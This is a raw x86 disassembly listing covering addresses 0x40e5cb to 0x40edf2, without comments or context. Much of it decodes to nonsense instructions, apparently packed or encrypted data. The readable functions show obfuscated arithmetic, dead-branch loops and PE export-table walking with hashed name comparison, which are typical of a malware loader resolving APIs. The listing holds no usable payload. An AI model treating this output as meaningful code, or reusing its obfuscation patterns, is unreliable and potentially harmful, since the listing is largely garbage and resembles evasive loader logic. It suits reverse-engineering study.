  40e5cb:	int3   
  40e5cc:	push   edi
  40e5cd:	xchg   esp,eax
  40e5ce:	mov    esi,DWORD PTR [ecx-0x4aad2fb7]
  40e5d4:	iret   
  40e5d5:	call   0x428e:0xe63297dc
  40e5dc:	adc    DWORD PTR [edx],edx
  40e5de:	ins    BYTE PTR es:[edi],dx
  40e5df:	mov    WORD PTR [ecx],ds
  40e5e1:	push   ecx
  40e5e2:	mov    esp,edx
  40e5e4:	dec    edi
  40e5e5:	xchg   edi,eax
  40e5e6:	adc    DWORD PTR [ebx-0x6efb3e32],0x78ac6542
  40e5f0:	inc    edi
  40e5f1:	jnp    0x40e5b7
  40e5f3:	xchg   edi,eax
  40e5f4:	mov    ch,0x27
  40e5f6:	adc    eax,0x88b1a285
  40e5fb:	add    al,0xf0
  40e5fd:	rcl    DWORD PTR [esi+0x1c],0x9a
  40e601:	jns    0x40e64b
  40e603:	cld    
  40e604:	(bad)  
  40e606:	out    0x5f,eax
  40e608:	inc    esi
  40e609:	add    bh,cl
  40e60b:	adc    edx,edi
  40e60d:	(bad)  
  40e60e:	jge    0x40e689
  40e610:	fisub  WORD PTR [eax+0x26efb296]
  40e616:	pushf  
  40e617:	sub    DWORD PTR [esi+0x1],ecx
  40e61a:	sub    cl,BYTE PTR [ecx]
  40e61c:	fwait
  40e61d:	out    0xf1,eax
  40e61f:	ins    DWORD PTR es:[edi],dx
  40e620:	mov    ds:0x500ab68f,al
  40e625:	out    dx,al
  40e626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e627:	cmp    BYTE PTR [edx+edi*8],ch
  40e62a:	fiadd  WORD PTR [edi+0x6c]
  40e62d:	mov    eax,0x96ee2a52
  40e632:	lds    ebx,FWORD PTR [esp+ecx*2]
  40e635:	das    
  40e636:	les    eax,FWORD PTR [ebx-0x4b]
  40e639:	dec    ebp
  40e63a:	je     0x40e645
  40e63c:	jp     0x40e652
  40e63e:	pop    ebx
  40e63f:	fiadd  DWORD PTR [eax]
  40e641:	aad    0xd5
  40e643:	mov    esi,0x24f52261
  40e648:	inc    ecx
  40e649:	sub    DWORD PTR [edi],ebp
  40e64b:	(bad)  
  40e64c:	test   DWORD PTR [edi],0x2b369b81
  40e652:	in     eax,dx
  40e653:	push   esp
  40e654:	or     ah,ch
  40e656:	xchg   BYTE PTR [edi-0x5aad3840],al
  40e65c:	mov    BYTE PTR [edx-0x2],cl
  40e65f:	cmc    
  40e660:	ja     0x40e67d
  40e662:	stos   BYTE PTR es:[edi],al
  40e663:	cmc    
  40e664:	or     eax,0x14396b74
  40e669:	fs xchg edi,eax
  40e66b:	or     eax,0xf2a1121
  40e670:	or     esp,DWORD PTR [ecx+ecx*1-0x6849622b]
  40e677:	inc    esp
  40e678:	cmp    al,0x17
  40e67a:	jecxz  0x40e6a4
  40e67c:	in     al,dx
  40e67d:	mov    edx,0xcd45bce
  40e682:	mov    esi,0x28607b1c
  40e687:	in     al,dx
  40e688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e689:	xor    ebp,esp
  40e68b:	popa   
  40e68c:	add    DWORD PTR [edi+0x40],esp
  40e68f:	inc    edi
  40e690:	jo     0x40e6de
  40e692:	sub    al,0xf5
  40e694:	fwait
  40e695:	push   ss
  40e696:	xor    al,0xea
  40e698:	cmp    eax,edi
  40e69a:	jae    0x40e6da
  40e69c:	push   0x4e77ccda
  40e6a1:	lock dec ebx
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	outs   dx,BYTE PTR ds:[esi]
  40e6a6:	jp     0x40e65e
  40e6a8:	mov    dl,0x55
  40e6aa:	or     dl,BYTE PTR [edx+edx*1+0x72]
  40e6ae:	xchg   esi,eax
  40e6af:	mul    DWORD PTR [esi+edx*8]
  40e6b2:	ja     0x40e6b8
  40e6b4:	dec    esp
  40e6b5:	stc    
  40e6b6:	ds pop ebp
  40e6b8:	mov    ecx,DWORD PTR [ebx-0x6735abbc]
  40e6be:	les    eax,FWORD PTR [eax+0x10ed2ab2]
  40e6c4:	jae    0x40e703
  40e6c6:	je     0x40e686
  40e6c8:	pop    ds
  40e6c9:	or     eax,0x62e2e90b
  40e6ce:	pop    eax
  40e6cf:	jmp    0xd5bb1d42
  40e6d4:	inc    esp
  40e6d5:	mov    WORD PTR [esi],fs
  40e6d7:	lahf   
  40e6d8:	push   0xb7347f46
  40e6dd:	xor    eax,0x522a9faf
  40e6e2:	std    
  40e6e3:	dec    ecx
  40e6e4:	dec    edx
  40e6e5:	push   ecx
  40e6e6:	sti    
  40e6e7:	dec    esp
  40e6e8:	cli    
  40e6e9:	mov    eax,0x6b0ac2ac
  40e6ee:	push   es
  40e6ef:	inc    ecx
  40e6f0:	adc    esi,DWORD PTR [ecx-0x7dd7e53f]
  40e6f6:	pop    edi
  40e6f7:	mov    dh,0x18
  40e6f9:	mov    edi,0x1c3b69c
  40e6fe:	cmp    DWORD PTR [edi],ebp
  40e700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e701:	js     0x40e694
  40e703:	sub    al,0x3c
  40e705:	and    esp,DWORD PTR [ebp-0x59]
  40e708:	jne    0x40e6c9
  40e70a:	xor    al,0xba
  40e70c:	adc    ah,cl
  40e70e:	sub    BYTE PTR [edx+0xa],bh
  40e711:	xor    eax,0xe9c67cfd
  40e716:	xlat   BYTE PTR ds:[ebx]
  40e717:	xchg   esi,eax
  40e718:	clc    
  40e719:	enter  0xa81d,0xa3
  40e71d:	test   al,0x57
  40e71f:	mov    eax,0x80c8d915
  40e724:	ja     0x40e788
  40e726:	inc    ecx
  40e727:	mov    al,ds:0xfdd47b8
  40e72c:	inc    esi
  40e72d:	fnstcw WORD PTR [edi]
  40e72f:	adc    bl,BYTE PTR ds:0xd25a5349
  40e735:	enter  0xf07,0xe2
  40e739:	sub    DWORD PTR [edx],ebx
  40e73b:	xor    BYTE PTR fs:[ebp+0x5d0b4c4],cl
  40e742:	outs   dx,BYTE PTR ds:[esi]
  40e743:	(bad)  [ebp+0x190ba53f]
  40e749:	jmp    0xd0ce16c1
  40e74e:	mov    bl,ah
  40e750:	pop    eax
  40e751:	iret   
  40e752:	xor    esp,DWORD PTR [edx]
  40e754:	data16 out 0xd6,al
  40e757:	(bad)  
  40e759:	mov    al,ds:0xf77c528
  40e75e:	cmp    dh,BYTE PTR [esp+edi*8+0x774ce33f]
  40e765:	xchg   esi,edx
  40e767:	pop    esp
  40e768:	addr16 aas 
  40e76a:	cli    
  40e76b:	ret    
  40e76c:	neg    dl
  40e76e:	adc    ebp,eax
  40e770:	cmp    DWORD PTR [ebx-0xb],ebp
  40e773:	xchg   esp,eax
  40e774:	lahf   
  40e775:	(bad)  
  40e776:	shl    BYTE PTR [ebx+0x2db5c57f],cl
  40e77c:	bound  esi,QWORD PTR [ecx+0x5d]
  40e77f:	sub    esi,0x40b086ef
  40e785:	push   ecx
  40e786:	jo     0x40e788
  40e788:	pop    es
  40e789:	int    0xe1
  40e78b:	mov    ah,0xb0
  40e78d:	adc    bl,BYTE PTR [esi]
  40e78f:	jae    0x40e76f
  40e791:	scas   al,BYTE PTR es:[edi]
  40e792:	cld    
  40e793:	push   esp
  40e794:	fidiv  WORD PTR [ebx+0x6d]
  40e797:	bound  edi,QWORD PTR [esi+0x1f7e51ee]
  40e79d:	enter  0xaa43,0x5f
  40e7a1:	xchg   ecx,eax
  40e7a2:	or     eax,0x4fc75e0e
  40e7a7:	mov    ah,0x5b
  40e7a9:	sar    BYTE PTR [edi],cl
  40e7ab:	(bad)  
  40e7ac:	jmp    0x40e7af
  40e7ae:	nop
  40e7af:	dec    esp
  40e7b0:	fiadd  WORD PTR [eax]
  40e7b2:	vpminub xmm2,xmm7,XMMWORD PTR ds:[edi]
  40e7b7:	jmp    0x5b24fe77
  40e7bc:	fdivr  QWORD PTR [eax]
  40e7be:	sar    BYTE PTR [esi+0x51],cl
  40e7c1:	jge    0x40e787
  40e7c3:	mov    dh,0x9
  40e7c5:	mov    WORD PTR [edx],es
  40e7c7:	cmc    
  40e7c8:	les    esi,FWORD PTR [ebp+0x385a8323]
  40e7ce:	dec    edx
  40e7cf:	xchg   esp,eax
  40e7d0:	dec    dh
  40e7d2:	sbb    al,0x40
  40e7d5:	lock mul DWORD PTR [edx-0x731cdace]
  40e7dc:	cmp    cl,al
  40e7de:	push   0xffffffaa
  40e7e0:	pop    ds
  40e7e1:	fcomp  st(0)
  40e7e3:	sbb    esi,DWORD PTR ds:0x5bce3fa5
  40e7e9:	hlt    
  40e7ea:	inc    ebp
  40e7eb:	and    ah,ah
  40e7ed:	fidiv  WORD PTR [ebp-0x45610c94]
  40e7f3:	jne    0x40e819
  40e7f5:	adc    al,0xec
  40e7f7:	int    0x71
  40e7f9:	mov    edx,0x104118e9
  40e7fe:	cli    
  40e7ff:	mov    al,0xc3
  40e801:	sub    eax,0x592cc37f
  40e806:	iret   
  40e807:	gs aam 0x3f
  40e80a:	sbb    eax,0xf617b081
  40e80f:	daa    
  40e810:	dec    ebp
  40e811:	test   BYTE PTR [esi],dh
  40e813:	test   al,0xf5
  40e815:	xchg   ebx,eax
  40e816:	adc    DWORD PTR [esi-0x6e],edi
  40e819:	rcl    DWORD PTR [ebp-0x2ae0b441],0xb
  40e820:	ret    0x4137
  40e823:	jle    0x40e83a
  40e825:	loop   0x40e860
  40e827:	dec    eax
  40e828:	shl    BYTE PTR [edx],1
  40e82a:	jecxz  0x40e836
  40e82c:	mov    bh,0x47
  40e82e:	mov    ebx,0xe487ed59
  40e833:	dec    eax
  40e834:	int3   
  40e835:	mov    dl,0x32
  40e837:	enter  0xd477,0xef
  40e83b:	gs (bad) 
  40e83d:	arpl   WORD PTR [esi-0x1904c39b],cx
  40e843:	jecxz  0x40e821
  40e845:	dec    eax
  40e846:	mov    bh,0xd6
  40e848:	adc    bh,BYTE PTR [eax]
  40e84a:	push   ss
  40e84b:	pop    edx
  40e84c:	sbb    eax,0x605f4082
  40e851:	out    dx,al
  40e852:	in     eax,dx
  40e853:	xor    bh,cl
  40e855:	out    dx,eax
  40e856:	scas   al,BYTE PTR es:[edi]
  40e857:	enter  0x4e52,0x4f
  40e85b:	sbb    eax,0x778dffb9
  40e860:	fisub  DWORD PTR [edi-0x72502984]
  40e866:	lahf   
  40e867:	test   eax,0x74f62910
  40e86c:	jb     0x40e885
  40e86e:	out    0xfc,eax
  40e870:	popa   
  40e871:	in     eax,dx
  40e872:	sub    BYTE PTR [eax+0x10c1e759],bl
  40e878:	sbb    dh,ch
  40e87a:	cmp    eax,0x5bd34537
  40e87f:	jl     0x40e82c
  40e881:	mov    bl,0xdf
  40e883:	cmp    edx,DWORD PTR [edx-0x61]
  40e886:	fsubp  st(6),st
  40e888:	mov    ch,0x9d
  40e88a:	pop    es
  40e88b:	and    bh,bl
  40e88d:	dec    edi
  40e88e:	sbb    bl,BYTE PTR [edi]
  40e890:	leave  
  40e891:	push   0x5fad12f7
  40e896:	ins    DWORD PTR es:[edi],dx
  40e897:	mov    ds:0x2218d5fd,al
  40e89c:	nop
  40e89d:	xor    al,0x7a
  40e8a0:	fcom   st(4)
  40e8a2:	jne    0x40e915
  40e8a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8a5:	push   edx
  40e8a6:	push   esp
  40e8a7:	scas   al,BYTE PTR es:[edi]
  40e8a8:	jb     0x40e8cf
  40e8aa:	adc    dh,BYTE PTR [eax+esi*2]
  40e8ad:	mov    dl,BYTE PTR [edx-0x328e52d7]
  40e8b3:	xor    eax,0xb7519751
  40e8b8:	retf   
  40e8b9:	fistp  DWORD PTR [ebx]
  40e8bb:	mov    ebx,0x1681c049
  40e8c0:	push   0x16
  40e8c2:	fwait
  40e8c3:	in     al,0x4c
  40e8c5:	adc    BYTE PTR [ebx+0x4e],al
  40e8c8:	popaw  
  40e8ca:	dec    edi
  40e8cb:	mov    ecx,0xc1150709
  40e8d0:	fisttp QWORD PTR [edi-0x7a2e6a75]
  40e8d6:	xchg   edx,eax
  40e8d7:	sbb    DWORD PTR [edi+edi*4],eax
  40e8da:	iret   
  40e8db:	sbb    BYTE PTR [edi-0x39d37c14],dh
  40e8e1:	cld    
  40e8e2:	fcomp  DWORD PTR [ecx]
  40e8e4:	out    dx,eax
  40e8e5:	jecxz  0x40e89f
  40e8e7:	adc    DWORD PTR [edx],0xffffffa1
  40e8ea:	add    cl,ah
  40e8ec:	add    al,0x12
  40e8ee:	or     al,0x1c
  40e8f0:	sub    eax,0xfac415c7
  40e8f5:	in     al,dx
  40e8f6:	cmp    eax,0x96f0287b
  40e8fb:	lahf   
  40e8fc:	rep stos DWORD PTR es:[edi],eax
  40e8fe:	stos   DWORD PTR es:[edi],eax
  40e8ff:	lds    ecx,FWORD PTR ds:[edi]
  40e902:	mov    ebp,0xc45bfcac
  40e907:	xor    ebp,DWORD PTR [ebx+0x7]
  40e90a:	jmp    0xda342a8d
  40e90f:	lahf   
  40e910:	inc    edi
  40e911:	int    0x5a
  40e913:	or     ebp,DWORD PTR [ecx-0x55]
  40e916:	enter  0x8b5f,0x6a
  40e91a:	fwait
  40e91b:	dec    esp
  40e91c:	repnz fidivr DWORD PTR [edi]
  40e91f:	sub    eax,0x3c4489c2
  40e924:	shr    BYTE PTR [edx-0x352fb8a7],0xee
  40e92b:	stos   DWORD PTR es:[edi],eax
  40e92c:	lods   al,BYTE PTR ds:[esi]
  40e92d:	(bad)  
  40e92e:	xchg   ebp,ebp
  40e930:	mov    ebx,0xe8846ea0
  40e935:	push   esi
  40e936:	sbb    dl,BYTE PTR [edx]
  40e938:	rcl    ebp,0x73
  40e93b:	pop    es
  40e93c:	lock retw 0x31d2
  40e941:	fld    TBYTE PTR [eax-0x64b7f2aa]
  40e947:	mov    ecx,0xde92f565
  40e94c:	cmp    al,0x78
  40e94e:	enter  0x847a,0x49
  40e952:	shl    DWORD PTR [edi+0x20],0x9c
  40e956:	mov    DWORD PTR [ebx-0x707525be],esp
  40e95c:	jne    0x40e9d4
  40e95e:	out    dx,al
  40e95f:	jnp    0x40e98a
  40e961:	das    
  40e962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e963:	jns    0x40e909
  40e965:	mov    eax,ds:0xe572e017
  40e96a:	test   ecx,edi
  40e96c:	aas    
  40e96d:	jne    0x40e94a
  40e96f:	mov    edx,0xbafc2206
  40e974:	ins    BYTE PTR es:[edi],dx
  40e975:	lahf   
  40e976:	popa   
  40e977:	add    dh,BYTE PTR [ebp-0x6beca4a8]
  40e97d:	cdq    
  40e97e:	jecxz  0x40e9ca
  40e980:	test   DWORD PTR [ecx],edi
  40e982:	jnp    0x40e9a7
  40e984:	or     DWORD PTR cs:[edi],0xffffffe0
  40e988:	iret   
  40e989:	xor    eax,0x192dd40c
  40e98e:	sbb    BYTE PTR [edi],ah
  40e990:	popa   
  40e991:	in     eax,dx
  40e992:	mov    ds:0x12d04aad,eax
  40e997:	push   esp
  40e998:	mov    edi,DWORD PTR [eax+0x3c]
  40e99b:	lea    esi,[edi+esi*8+0x78]
  40e99f:	mov    esi,DWORD PTR [esi+eax*1]
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	jp     0x40ed1e
  40ecee:	pop    ss
  40ecef:	fidivr WORD PTR [esp+ecx*8+0x7c]
  40ecf3:	jl     0x40ed35
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	imul   DWORD PTR [esi+ebx*2+0x3c]
  40ecfc:	cmp    esi,DWORD PTR [esi]
  40ecfe:	inc    edx
  40ecff:	add    esp,DWORD PTR [edi-0x247f1f98]
  40ed05:	pop    ebp
  40ed06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed07:	jnp    0x40ec92
  40ed09:	ss mov ch,0xbc
  40ed0c:	cmc    
  40ed0d:	(bad)  
  40ed0e:	and    esi,ebp
  40ed10:	xlat   BYTE PTR ds:[ebx]
  40ed11:	int3   
  40ed12:	dec    ecx
  40ed13:	jg     0x40ed05
  40ed15:	call   0xcdfdd59a
  40ed1a:	ja     0x40ecd1
  40ed1c:	add    ah,BYTE PTR [esi+0x49]
  40ed1f:	push   ebx
  40ed20:	mov    esp,0xdb0d1476
  40ed25:	out    0x2f,eax
  40ed27:	or     al,0x30
  40ed29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed2a:	cmp    edi,DWORD PTR [eax+eiz*2]
  40ed2d:	adc    esi,DWORD PTR [esi+edx*1+0x7b622890]
  40ed34:	dec    edi
  40ed35:	xor    eax,DWORD PTR [eax]
  40ed37:	xchg   DWORD PTR [ebx],eax
  40ed39:	dec    ebp
  40ed3a:	ret    
  40ed3b:	xlat   BYTE PTR ds:[ebx]
  40ed3c:	mov    eax,0x18d33f2f
  40ed41:	and    eax,0xfcd4b60e
  40ed46:	ret    0xe699
  40ed49:	and    BYTE PTR [edx+eax*4],bl
  40ed4c:	sqrtps xmm7,XMMWORD PTR [ebx+0x66]
  40ed50:	jmp    0x6ea9:0x72967255
  40ed57:	out    dx,eax
  40ed58:	cmp    eax,0xff18054f
  40ed5d:	push   ds
  40ed5e:	std    
  40ed5f:	jbe    0x40ed13
  40ed61:	fcmovnbe st,st(1)
  40ed63:	imul   BYTE PTR [ebp+0x20]
  40ed66:	pop    ebp
  40ed67:	lock rol esp,0x56
  40ed6b:	push   0x7a14981
  40ed70:	dec    ebp
  40ed71:	mul    DWORD PTR [eax]
  40ed73:	cdq    
  40ed74:	(bad)  
  40ed75:	fidivr DWORD PTR [edx-0x3b]
  40ed78:	and    eax,0xa19a391a
  40ed7d:	std    
  40ed7e:	pop    esp
  40ed7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed80:	pop    ss
  40ed81:	xlat   BYTE PTR ds:[ebx]
  40ed82:	dec    edi
  40ed83:	aas    
  40ed84:	cmp    al,0xc0
  40ed86:	pop    edi
  40ed87:	add    BYTE PTR [eax+edx*8-0x66744a22],bl
  40ed8e:	stc    
  40ed8f:	in     al,0xc9
  40ed91:	and    eax,0xcc0998f4
  40ed96:	mov    WORD PTR [ebp+0x21],cs
  40ed99:	mov    ?,WORD PTR [eax]
  40ed9b:	mov    dl,0xd2
  40ed9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed9e:	call   0x44f1fd46
  40eda3:	shl    bl,1
  40eda5:	enter  0xe40f,0x5c
  40eda9:	mov    ch,BYTE PTR [ecx+0x2c]
  40edac:	test   DWORD PTR [edi],0xc454a622
  40edb2:	adc    ebp,ecx
  40edb4:	ret    0x45db
  40edb7:	pop    esi
  40edb8:	lahf   
  40edb9:	out    0x52,eax
  40edbb:	jnp    0x40ed87
  40edbd:	inc    ecx
  40edbe:	jbe    0x40ed60
  40edc0:	cmp    dl,bl
  40edc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edc3:	imul   ebp,DWORD PTR [eax],0x42
  40edc6:	or     al,0xc4
  40edc8:	aas    
  40edc9:	or     DWORD PTR [edx+0x26],edx
  40edcc:	(bad)
  40edcf:	sub    eax,0x5279c5d4
  40edd4:	lds    edx,FWORD PTR [edx+ecx*4]
  40edd7:	popf   
  40edd8:	adc    bh,BYTE PTR [edx]
  40edda:	in     eax,0x60
  40eddc:	mov    eax,0xb413cdaa
  40ede1:	dec    esi
  40ede2:	mov    ch,0x29
  40ede4:	mov    DWORD PTR [edi-0x27861455],eax
  40edea:	push   ecx
  40edeb:	sub    DWORD PTR [esi+0x46de9090],ecx
  40edf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf2:	fs retf 
